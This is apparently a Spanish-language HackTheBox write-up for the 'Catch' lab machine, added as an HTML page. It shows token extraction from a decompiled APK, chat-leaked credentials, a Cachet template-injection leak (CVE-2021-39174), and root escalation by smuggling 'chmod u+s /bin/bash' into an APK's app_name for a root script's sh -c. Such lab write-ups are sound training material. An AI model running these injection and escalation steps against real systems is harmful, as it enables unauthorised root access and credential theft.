@@ -1,0 +1,435 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Catch HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/catch.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Catch HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Catch de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Catch de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Catch HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Catch HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Catch de la plataforma de HackTheBox","headline":"Writeup Catch HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Catch HackTheBox</h1>
+          <p>Resolución de la máquina Catch de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.150
+Nmap scan report for 10.10.11.150
+22/tcp   open  ssh
+80/tcp   open  http
+3000/tcp open  ppp
+5000/tcp open  upnp
+8000/tcp open  http-alt</span>
+</code></pre></div></div>
+
+<div><p>Si miramos la web encontramos que podemos descargar un apk</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Descargamos el apk y <a href="https://github.com/iBotPeaches/Apktool">apktool</a> para decompilarlo y empezar a ver que encontramos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wget</span><span class="p"> http://10.10.11.150/catchv1.0.apk
+Longitud: 3356353 (3.2M) [application/vnd.android.package-archive]
+Grabando a: «catchv1.0.apk»
+catchv1.0.apk                           100%[=============================================================================>]   3.20M
+«catchv1.0.apk» guardado [3356353/3356353]
+</span><span class="s2">❯ wget</span><span class="p"> https://github.com/iBotPeaches/Apktool/releases/download/v2.6.1/apktool_2.6.1.jar
+Longitud: 19981711 (19M) [application/octet-stream]
+Grabando a: «apktool_2.6.1.jar»
+apktool_2.6.1.jar                       100%[=============================================================================>]  19.06M
+«apktool_2.6.1.jar» guardado [19981711/19981711]</span>
+</code></pre></div></div>
+
+<div><p>Decompilamos el apk y buscamos recursivamente por archivos que contengan la palabra token ya que parece que tiene "integraciones", ¡encontramos un token!</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ java</span><span class="p"> -jar apktool_2.6.1.jar d catchv1.0.apk
+I: Using Apktool 2.6.1 on catchv1.0.apk
+I: Loading resource table...
+I: Decoding AndroidManifest.xml with resources...
+I: Loading resource table from file: ~/.local/share/apktool/framework/1.apk
+I: Regular manifest package...
+I: Decoding file-resources...
+I: Decoding values */* XMLs...
+I: Baksmaling classes.dex...
+I: Copying assets and libs...
+I: Copying unknown files...
+I: Copying original files...
+</span><span class="s2">❯ grep</span><span class="p"> -r </span><span class="no">"token"</span><span class="k">
+token</span><span class="p">:</span><span class="na">catchv1.0/res/values/strings.xml</span><span class="p">:    </span><span class="no">&ltstring </span><span class="p">name=</span><span class="s2">"gitea_</span><span class="kd">token</span><span class="s2">"</span><span class="no">></span><span class="p">b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0</span><span class="no">&lt/string>
+</span><span class="k">token</span><span class="p">:</span><span class="na">catchv1.0/res/values/strings.xml</span><span class="p">:    </span><span class="no">&ltstring</span><span class="p"> name=</span><span class="s2">"lets_chat_</span><span class="kd">token</span><span class="s2">"</span><span class="no">></span><span class="p">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==</span><span class="no">&lt/string></span>
+</code></pre></div></div>
+
+<div><p>Usaremos la segunda cookie como header para una petición por curl al puerto 5000, demos un vistazo a rooms</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> 10.10.11.150:5000/rooms -H </span><span class="no">"Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="</span><span class="p"> |</span><span class="s2"> jq</span><span class="p">
+[
+  {
+    </span><span class="na">"id"</span><span class="p">:</span><span class="s2"> "61b86b28d984e2451036eb17"</span><span class="p">,
+    </span><span class="na">"slug"</span><span class="p">: </span><span class="s2">"status"</span><span class="p">,
+    </span><span class="na">"name"</span><span class="p">: </span><span class="s2">"Status"</span><span class="p">,
+    </span><span class="na">"description"</span><span class="p">: </span><span class="s2">"Cachet Updates and Maintenance"</span><span class="p">,
+    </span><span class="na">"lastActive"</span><span class="p">: </span><span class="s2">"2021-12-14T10:34:20.749Z"</span><span class="p">,
+    </span><span class="na">"created"</span><span class="p">: </span><span class="s2">"2021-12-14T10:00:08.384Z"</span><span class="p">,
+    </span><span class="na">"owner"</span><span class="p">: </span><span class="s2">"61b86aead984e2451036eb16"</span><span class="p">,
+    </span><span class="na">"private"</span><span class="p">: false,
+    </span><span class="na">"hasPassword"</span><span class="p">: false,
+    </span><span class="na">"participants"</span><span class="p">: []
+  },
+  {
+    </span><span class="na">"id"</span><span class="p">: </span><span class="s2">"61b8708efe190b466d476bfb"</span><span class="p">,
+    </span><span class="na">"slug"</span><span class="p">: </span><span class="s2">"android_dev"</span><span class="p">,
+    </span><span class="na">"name"</span><span class="p">: </span><span class="s2">"Android Development"</span><span class="p">,
+    </span><span class="na">"description"</span><span class="p">: </span><span class="s2">"Android App Updates, Issues & More"</span><span class="p">,
+    </span><span class="na">"lastActive"</span><span class="p">: </span><span class="s2">"2021-12-14T10:24:21.145Z"</span><span class="p">,
+    </span><span class="na">"created"</span><span class="p">: </span><span class="s2">"2021-12-14T10:23:10.474Z"</span><span class="p">,
+    </span><span class="na">"owner"</span><span class="p">: </span><span class="s2">"61b86aead984e2451036eb16"</span><span class="p">,
+    </span><span class="na">"private"</span><span class="p">: false,
+    </span><span class="na">"hasPassword"</span><span class="p">: false,
+    </span><span class="na">"participants"</span><span class="p">: []
+  },
+  {
+    </span><span class="na">"id"</span><span class="p">: </span><span class="s2">"61b86b3fd984e2451036eb18"</span><span class="p">,
+    </span><span class="na">"slug"</span><span class="p">: </span><span class="s2">"employees"</span><span class="p">,
+    </span><span class="na">"name"</span><span class="p">: </span><span class="s2">"Employees"</span><span class="p">,
+    </span><span class="na">"description"</span><span class="p">: </span><span class="s2">"New Joinees, Org updates"</span><span class="p">,
+    </span><span class="na">"lastActive"</span><span class="p">: </span><span class="s2">"2021-12-14T10:18:04.710Z"</span><span class="p">,
+    </span><span class="na">"created"</span><span class="p">: </span><span class="s2">"2021-12-14T10:00:31.043Z"</span><span class="p">,
+    </span><span class="na">"owner"</span><span class="p">: </span><span class="s2">"61b86aead984e2451036eb16"</span><span class="p">,
+    </span><span class="na">"private"</span><span class="p">: false,
+    </span><span class="na">"hasPassword"</span><span class="p">: false,
+    </span><span class="na">"participants"</span><span class="p">: []
+  }
+]</span>
+</code></pre></div></div>
+
+<div><p>Si grepeamos por id simplemente nos quedamos con el id del mensaje</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> 10.10.11.150:5000/rooms -H </span><span class="no">"Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" </span><span class="p">|</span><span class="s2"> jq </span><span class="p">| </span><span class="s2">grep</span><span class="p"> \"id\"
+</span><span class="na">"id"</span><span class="p">: </span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">,
+</span><span class="na">"id"</span><span class="p">: </span><span class="s2">"61b8708efe190b466d476bfb"</span><span class="p">,
+</span><span class="na">"id"</span><span class="p">: </span><span class="s2">"61b86b3fd984e2451036eb18"</span><span class="p">,</span>
+</code></pre></div></div>
+
+<div><p>Si revisamos el primero vemos lo siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> 10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages -H </span><span class="no">"Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" </span><span class="p">|</span><span class="s2"> jq</span><span class="p">
+[
+  {
+    </span><span class="na">"id"</span><span class="p">:</span><span class="s2"> "61b8732cfe190b466d476c02"</span><span class="p">,
+    </span><span class="na">"text"</span><span class="p">:</span><span class="s2"> "ah sure!"</span><span class="p">,
+    </span><span class="na">"posted"</span><span class="p">:</span><span class="s2"> "2021-12-14T10:34:20.749Z"</span><span class="p">,
+    </span><span class="na">"owner"</span><span class="p">:</span><span class="s2"> "61b86dbdfe190b466d476bf0"</span><span class="p">,
+    </span><span class="na">"room"</span><span class="p">:</span><span class="s2"> "61b86b28d984e2451036eb17"</span><span class="p">
+  },
+  {
+    </span><span class="na">"id"</span><span class="p">:</span><span class="s2"> "61b8731ffe190b466d476c01"</span><span class="p">,
+    </span><span class="na">"text"</span><span class="p">:</span><span class="s2"> "You should actually include this task to your list as well as a part of quarterly audit"</span><span class="p">,
+    </span><span class="na">"posted"</span><span class="p">:</span><span class="s2"> "2021-12-14T10:34:07.449Z"</span><span class="p">,
+    </span><span class="na">"owner"</span><span class="p">:</span><span class="s2"> "61b86aead984e2451036eb16"</span><span class="p">,
+    </span><span class="na">"room"</span><span class="p">:</span><span class="s2"> "61b86b28d984e2451036eb17"</span><span class="p">
+  },
+  {
+    </span><span class="na">"id"</span><span class="p">:</span><span class="s2"> "61b872b9fe190b466d476c00"</span><span class="p">,
+    </span><span class="na">"text"</span><span class="p">:</span><span class="s2"> "Also make sure we've our systems, applications and databases up-to-date."</span><span class="p">,
+    </span><span class="na">"posted"</span><span class="p">:</span><span class="s2"> "2021-12-14T10:32:25.514Z"</span><span class="p">,
+    </span><span class="na">"owner"</span><span class="p">:</span><span class="s2"> "61b86dbdfe190b466d476bf0"</span><span class="p">,
+    </span><span class="na">"room"</span><span class="p">:</span><span class="s2"> "61b86b28d984e2451036eb17"</span><span class="p">
+  },
+  {
+    </span><span class="na">"id"</span><span class="p">:</span><span class="s2"> "61b87282fe190b466d476bff"</span><span class="p">,
+    </span><span class="na">"text"</span><span class="p">:</span><span class="s2"> "Excellent! "</span><span class="p">,
+    </span><span class="na">"posted"</span><span class="p">:</span><span class="s2"> "2021-12-14T10:31:30.403Z"</span><span class="p">,
+    </span><span class="na">"owner"</span><span class="p">:</span><span class="s2"> "61b86aead984e2451036eb16"</span><span class="p">,
+    </span><span class="na">"room"</span><span class="p">:</span><span class="s2"> "61b86b28d984e2451036eb17"</span><span class="p">
+  },
+  {
+    </span><span class="na">"id"</span><span class="p">:</span><span class="s2"> "61b87277fe190b466d476bfe"</span><span class="p">,
+    </span><span class="na">"text"</span><span class="p">:</span><span class="s2"> "Why not. We've this in our todo list for next quarter"</span><span class="p">,
+    </span><span class="na">"posted"</span><span class="p">:</span><span class="s2"> "2021-12-14T10:31:19.094Z"</span><span class="p">,
+    </span><span class="na">"owner"</span><span class="p">:</span><span class="s2"> "61b86dbdfe190b466d476bf0"</span><span class="p">,
+    </span><span class="na">"room"</span><span class="p">:</span><span class="s2"> "61b86b28d984e2451036eb17"</span><span class="p">
+  },
+  {
+    </span><span class="na">"id"</span><span class="p">:</span><span class="s2"> "61b87241fe190b466d476bfd"</span><span class="p">,
+    </span><span class="na">"text"</span><span class="p">:</span><span class="s2"> "@john is it possible to add SSL to our status domain to make sure everything is secure ? "</span><span class="p">,
+    </span><span class="na">"posted"</span><span class="p">:</span><span class="s2"> "2021-12-14T10:30:25.108Z"</span><span class="p">,
+    </span><span class="na">"owner"</span><span class="p">:</span><span class="s2"> "61b86aead984e2451036eb16"</span><span class="p">,
+    </span><span class="na">"room"</span><span class="p">:</span><span class="s2"> "61b86b28d984e2451036eb17"</span><span class="p">
+  },
+  {
+    </span><span class="na">"id"</span><span class="p">:</span><span class="s2"> "61b8702dfe190b466d476bfa"</span><span class="p">,
+    </span><span class="na">"text"</span><span class="p">:</span><span class="s2"> "Here are the credentials `john :  E}V!mywu_69T4C}W`"</span><span class="p">,
+    </span><span class="na">"posted"</span><span class="p">:</span><span class="s2"> "2021-12-14T10:21:33.859Z"</span><span class="p">,
+    </span><span class="na">"owner"</span><span class="p">:</span><span class="s2"> "61b86f15fe190b466d476bf5"</span><span class="p">,
+    </span><span class="na">"room"</span><span class="p">:</span><span class="s2"> "61b86b28d984e2451036eb17"</span><span class="p">
+  },
+  {
+    </span><span class="na">"id"</span><span class="p">:</span><span class="s2"> "61b87010fe190b466d476bf9"</span><span class="p">,
+    </span><span class="na">"text"</span><span class="p">:</span><span class="s2"> "Sure one sec."</span><span class="p">,
+    </span><span class="na">"posted"</span><span class="p">:</span><span class="s2"> "2021-12-14T10:21:04.635Z"</span><span class="p">,
+    </span><span class="na">"owner"</span><span class="p">:</span><span class="s2"> "61b86f15fe190b466d476bf5"</span><span class="p">,
+    </span><span class="na">"room"</span><span class="p">:</span><span class="s2"> "61b86b28d984e2451036eb17"</span><span class="p">
+  },
+  {
+    </span><span class="na">"id"</span><span class="p">:</span><span class="s2"> "61b86fb1fe190b466d476bf8"</span><span class="p">,
+    </span><span class="na">"text"</span><span class="p">:</span><span class="s2"> "Can you create an account for me ? "</span><span class="p">,
+    </span><span class="na">"posted"</span><span class="p">:</span><span class="s2"> "2021-12-14T10:19:29.677Z"</span><span class="p">,
+    </span><span class="na">"owner"</span><span class="p">:</span><span class="s2"> "61b86dbdfe190b466d476bf0"</span><span class="p">,
+    </span><span class="na">"room"</span><span class="p">:</span><span class="s2"> "61b86b28d984e2451036eb17"</span><span class="p">
+  },
+  {
+    </span><span class="na">"id"</span><span class="p">:</span><span class="s2"> "61b86f4dfe190b466d476bf6"</span><span class="p">,
+    </span><span class="na">"text"</span><span class="p">:</span><span class="s2"> "Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. "</span><span class="p">,
+    </span><span class="na">"posted"</span><span class="p">:</span><span class="s2"> "2021-12-14T10:17:49.761Z"</span><span class="p">,
+    </span><span class="na">"owner"</span><span class="p">:</span><span class="s2"> "61b86f15fe190b466d476bf5"</span><span class="p">,
+    </span><span class="na">"room"</span><span class="p">:</span><span class="s2"> "61b86b28d984e2451036eb17"</span><span class="p">
+  }
+]</span>
+</code></pre></div></div>
+
+<div><p>Encontramos unas credenciales para john en el puerto 8000</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> 10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages -H </span><span class="no">"Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" </span><span class="p">|</span><span class="s2"> jq</span><span class="p"> |</span><span class="s2"> grep</span><span class="p"> credentials
+</span><span class="na">"text"</span><span class="p">:</span><span class="s2"> "Here are the credentials `</span><span class="kd">john</span><span class="p"> :  </span><span class="kd">E}V!mywu_69T4C}W</span><span class="s2">`"</span><span class="p">,</span>
+</code></pre></div></div>
+
+<div><p>Nos autenticamos en el puerto 8000 y encontramos un apartado de "settings" y mail</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Encontramos el siguiente <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-39174">poc</a> que podemos probar, en este caso usaremos ${} para lekear información en el campo "Mail From Address", iniciamos con ${DB_USERNAME}</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Recargamos la página y vemos "will"</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Intentamos lo mismo con password y la obtenemos</p></div>
+<div><p><img src="./5.png"><p></div>
+<div><p><img src="./6.png"><p></div>
+
+<div><p>Podemos probar las credenciales por ssh ¡y funcionan! ahora conseguimos el user</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> will@10.10.11.150
+will@10.10.11.150's password: </span><span class="kd">s2#4Fg0_%3!
+</span><span class="s2">will@catch</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt
+4a0*************************dfb
+</span><span class="s2">will@catch</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Si miramos con pspy procesos, vemos que se ejecuta la siguiente tarea</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">CMD: UID=0    PID=312118 | /bin/bash /opt/mdm/verify.sh</span></code></pre></div></div>
+
+<div><p>Lo que contiene el archivo es lo siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">will@catch</span><span class="p">:</span><span class="na">/opt/mdm</span><span class="p">$ cat verify.sh
+</span><span class="c1">#!/bin/bash
+
+###################
+# Signature Check #
+###################
+
+</span><span class="k">sig_check</span><span class="p">() {
+	jarsigner </span><span class="no">-verify </span><span class="s2">"$1/$2" </span><span class="no">2</span><span class="kd">></span><span class="p">/dev/null </span><span class="kd">></span><span class="p">/dev/null
+	</span><span class="kd">if</span><span class="k"> [[</span><span class="p"> $? </span><span class="no">-eq</span><span class="p"> 0</span><span class="k"> ]]</span><span class="kd">; then</span><span class="k">
+		echo </span><span class="s2">'[+] Signature Check Passed'</span><span class="p">
+	</span><span class="kd">else</span><span class="k">
+		echo </span><span class="s2">'[!] Signature Check Failed. Invalid Certificate.'</span><span class="p">
+		cleanup
+		</span><span class="k">exit</span><span class="kd">
+	fi</span><span class="p">
+}
+</span><span class="c1">
+#######################
+# Compatibility Check #
+#######################
+</span><span class="k">
+comp_check</span><span class="p">() {
+	apktool d </span><span class="no">-s</span><span class="s2"> "$1/$2"</span><span class="no"> -o</span><span class="p"> $3 </span><span class="no">2</span><span class="kd">></span><span class="p">/dev/null </span><span class="kd">></span><span class="p">/dev/null
+	COMPILE_SDK_VER</span><span class="kd">=</span><span class="p">$(grep </span><span class="no">-oPm1</span><span class="s2"> "(?<=compileSdkVersion=\")[^\"]+" "$PROCESS_BIN/AndroidManifest.xml"</span><span class="p">)
+	</span><span class="kd">if </span><span class="k">[</span><span class="no"> -z </span><span class="s2">"$COMPILE_SDK_VER"</span><span class="k"> ]</span><span class="kd">; then</span><span class="k">
+		echo </span><span class="s2">'[!] Failed to find target SDK version.'</span><span class="p">
+		cleanup
+		</span><span class="k">exit
+	</span><span class="kd">else
+		</span><span class="kd">if </span><span class="k">[</span><span class="p"> $COMPILE_SDK_VER </span><span class="no">-lt</span><span class="p"> 18 </span><span class="k">]</span><span class="kd">; then</span><span class="k">
+			echo </span><span class="s2">"[!] APK Doesn't meet the requirements"</span><span class="p">
+			cleanup
+			</span><span class="k">exit
+		</span><span class="kd">fi
+	</span><span class="kd">fi
+}
+</span><span class="c1">
+####################
+# Basic App Checks #
+####################
+</span><span class="k">
+app_check</span><span class="p">() {
+	APP_NAME</span><span class="kd">=</span><span class="p">$(grep </span><span class="no">-oPm1</span><span class="s2"> "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml"</span><span class="p">)
+	</span><span class="k">echo</span><span class="p"> $APP_NAME
+	</span><span class="kd">if</span><span class="k"> [[</span><span class="p"> $APP_NAME</span><span class="kd"> == *</span><span class="s2">"Catch"</span><span class="kd">*</span><span class="k"> ]]</span><span class="kd">; then
+		</span><span class="k">echo</span><span class="no"> -n</span><span class="p"> $APP_NAME</span><span class="kd">|</span><span class="p">xargs </span><span class="no">-I</span><span class="p"> {} sh </span><span class="nno">-c</span><span class="s2"> 'mkdir {}'</span><span class="k">
+		mv </span><span class="s2">"$3/$APK_NAME" "$2/$APP_NAME/$4"</span><span class="p">
+	else
+		</span><span class="k">echo</span><span class="s2"> "[!] App doesn't belong to Catch Global"</span><span class="p">
+		cleanup
+		</span><span class="k">exit
+	</span><span class="kd">fi
+}
+
+</span><span class="c1">
+###########
+# Cleanup #
+###########
+</span><span class="k">
+cleanup</span><span class="p">() {
+	</span><span class="p">rm </span><span class="no">-rf </span><span class="p">$PROCESS_BIN</span><span class="kd">;</span><span class="p">rm</span><span class="no"> -rf </span><span class="s2">"$DROPBOX/*" "$IN_FOLDER/*"</span><span class="kd">;</span><span class="p">rm </span><span class="no">-rf </span><span class="p">$(ls </span><span class="no">-A</span><span class="p"> /opt/mdm </span><span class="kd">|</span><span class="p"> grep </span><span class="no">-v</span><span class="p"> apk_bin</span><span class="kd"> |</span><span class="p"> grep</span><span class="no"> -v </span><span class="p">verify.sh)
+}
+
+</span><span class="c1">
+###################
+# MDM CheckerV1.0 #
+###################
+</span><span class="p">
+DROPBOX</span><span class="kd">=</span><span class="s2">/opt/mdm/apk_bin</span><span class="p">
+IN_FOLDER</span><span class="kd">=</span><span class="s2">/root/mdm/apk_bin</span><span class="p">
+OUT_FOLDER</span><span class="kd">=</span><span class="s2">/root/mdm/certified_apps</span><span class="p">
+PROCESS_BIN</span><span class="kd">=</span><span class="s2">/root/mdm/process_bin</span><span class="p">
+
+</span><span class="kd">for</span><span class="p"> IN_APK_NAME </span><span class="kd">in </span><span class="p">$DROPBOX/</span><span class="kd">*</span><span class="p">.apk</span><span class="kd">;do
+	OUT_APK_NAME</span><span class="kd">=</span><span class="s2">"$(echo ${IN_APK_NAME##*/} | cut -d '.' -f1)_verified.apk"</span><span class="p">
+	APK_NAME</span><span class="kd">=</span><span class="s2">"$(openssl rand -hex 12).apk"</span><span class="kd">
+	if</span><span class="k"> [[</span><span class="no"> -L </span><span class="s2">"$IN_APK_NAME"</span><span class="k"> ]]</span><span class="kd">; then
+		</span><span class="k">exit
+	</span><span class="kd">else
+		</span><span class="p">mv </span><span class="s2">"$IN_APK_NAME" "$IN_FOLDER/$APK_NAME"</span><span class="kd">
+	fi</span><span class="p">
+	sig_check $IN_FOLDER $APK_NAME
+	comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN
+	app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME
+</span><span class="kd">done</span><span class="p">
+cleanup</span>
+</code></pre></div></div>
+
+<div><p>La función "app_check" está buscando "/res/values/strings.xml" en el apk en /opt/mdm/apk_bin</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="k">app_check</span><span class="p">() {
+	APP_NAME</span><span class="kd">=</span><span class="p">$(grep </span><span class="no">-oPm1</span><span class="s2"> "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml"</span><span class="p">)
+	</span><span class="k">echo</span><span class="p"> $APP_NAME
+	</span><span class="kd">if</span><span class="k"> [[</span><span class="p"> $APP_NAME</span><span class="kd"> == *</span><span class="s2">"Catch"</span><span class="kd">*</span><span class="k"> ]]</span><span class="kd">; then
+		</span><span class="k">echo</span><span class="no"> -n</span><span class="p"> $APP_NAME</span><span class="kd">|</span><span class="p">xargs </span><span class="no">-I</span><span class="p"> {} sh </span><span class="nno">-c</span><span class="s2"> 'mkdir {}'</span><span class="k">
+		mv </span><span class="s2">"$3/$APK_NAME" "$2/$APP_NAME/$4"</span><span class="p">
+	else
+		</span><span class="k">echo</span><span class="s2"> "[!] App doesn't belong to Catch Global"</span><span class="p">
+		cleanup
+		</span><span class="k">exit
+	</span><span class="kd">fi
+}</span>
+</code></pre></div></div>
+
+<div><p>Podemos abusar de esto modificando el apk de la siguiente manera, descargamos el apk y <a href="https://github.com/iBotPeaches/Apktool">apktool</a> (si los tienes de antes cuando buscamos el token no es necesario)</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wget</span><span class="p"> http://10.10.11.150/catchv1.0.apk
+Longitud: 3356353 (3.2M) [application/vnd.android.package-archive]
+Grabando a: «catchv1.0.apk»
+catchv1.0.apk                           100%[=============================================================================>]   3.20M
+«catchv1.0.apk» guardado [3356353/3356353]
+</span><span class="s2">❯ wget</span><span class="p"> https://github.com/iBotPeaches/Apktool/releases/download/v2.6.1/apktool_2.6.1.jar
+Longitud: 19981711 (19M) [application/octet-stream]
+Grabando a: «apktool_2.6.1.jar»
+apktool_2.6.1.jar                       100%[=============================================================================>]  19.06M
+«apktool_2.6.1.jar» guardado [19981711/19981711]</span>
+</code></pre></div></div>
+
+<div><p>Decompilamos el apk (si lo has hecho de antes cuando buscamos el token no es necesario)</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ java</span><span class="p"> -jar apktool_2.6.1.jar d catchv1.0.apk
+I: Using Apktool 2.6.1 on catchv1.0.apk
+I: Loading resource table...
+I: Decoding AndroidManifest.xml with resources...
+I: Loading resource table from file: ~/.local/share/apktool/framework/1.apk
+I: Regular manifest package...
+I: Decoding file-resources...
+I: Decoding values */* XMLs...
+I: Baksmaling classes.dex...
+I: Copying assets and libs...
+I: Copying unknown files...
+I: Copying original files...</span>
+</code></pre></div></div>
+
+<div><p>Despues de decompilarlo abrimos el archivo strings.xml en catchv1.0/res/values/ que ya contiene algunas funciones, modificaremos alguna como la que tiene "Catch"</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="no">&ltstring</span><span class="p"> name=</span><span class="s2">"abc_toolbar_collapse_description"</span><span class="no">></span><span class="p">Collapse</span><span class="no">&lt/string>
+</span><span class="no">&ltstring</span><span class="p"> name=</span><span class="s2">"app_name"</span><span class="no">></span><span class="k">Catch</span><span class="no">&lt/string></span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="no">&ltstring</span><span class="p"> name=</span><span class="s2">"abc_toolbar_collapse_description"</span><span class="no">></span><span class="p">Collapse</span><span class="no">&lt/string>
+</span><span class="no">&ltstring</span><span class="p"> name=</span><span class="s2">"app_name"</span><span class="no">></span><span class="k">Catch|chmod u+s /bin/bash</span><span class="no">&lt/string></span>
+</code></pre></div></div>
+
+<div><p>Ahora en la carpeta donde decompilamos el apk volveremos a compilar la carpeta con el valor modificado</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ java</span><span class="p"> -jar apktool_2.6.1.jar b -f -d catchv1.0 -o privesc.apk
+I: Using Apktool 2.6.1
+I: Smaling smali folder into classes.dex...
+I: Building resources...
+I: Building apk file...
+I: Copying unknown files/dir...
+I: Built apk...</span>
+</code></pre></div></div>
+
+<div><p>Subimos el apk a /dev/shm con scp</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ scp</span><span class="p"> privesc.apk will@10.10.11.150:/dev/shm
+will@10.10.11.150's password: </span><span class="kd">s2#4Fg0_%3!</span><span class="p">
+privesc.apk                                                   100%    2713KB</span>
+</code></pre></div></div>
+
+<div><p>Ahora desde la shell de will movemos el archivo a "/opt/mdm/apk_bin", esperamos aproximadamente un minuto y la bash es suid, somos root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">will@catch</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$ mv privesc.apk /opt/mdm/apk_bin/
+</span><span class="s2">will@catch</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
+</span><span class="s2">will@catch</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$ bash -p
+bash-5.0# whoami
+root
+bash-5.0# cat /root/root.txt 
+1ac**************************f42
+bash-5.0#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
